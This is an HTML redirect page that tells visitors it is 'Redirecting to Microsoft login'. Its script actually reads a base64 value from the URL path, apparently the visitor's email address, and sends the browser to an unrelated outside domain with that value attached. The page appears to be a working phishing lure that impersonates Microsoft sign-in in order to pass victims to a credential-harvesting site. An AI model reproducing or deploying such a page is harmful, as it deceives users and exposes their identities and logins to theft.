<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #0a0e14;
            color: #f0f4f8;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container { text-align: center; padding: 20px; }
        .spinner {
            width: 40px; height: 40px;
            border: 3px solid #1e2a3a;
            border-top-color: #00d4aa;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 16px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .message { color: #8b97a8; font-size: 14px; }
        .error { color: #ff6b6b; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner" id="spinner"></div>
        <div class="message" id="message">Redirecting to Microsoft login...</div>
    </div>
    <script>
        (function() {
            var path = window.location.pathname;
            var segments = path.split('/').filter(function(s) { return s.length > 0; });
            var emailB64 = segments[segments.length - 1];
            
            if (!emailB64 || emailB64 === 'index.html') {
                document.getElementById('spinner').style.display = 'none';
                document.getElementById('message').className = 'message error';
                document.getElementById('message').textContent = 'Invalid link';
                return;
            }
            
            window.location.href = 'https://startup.aliagaspor.com/Coh!5FyvqZmQVfbB8fwyhq/$' + emailB64;
        })();
    </script>
</body>
</html>
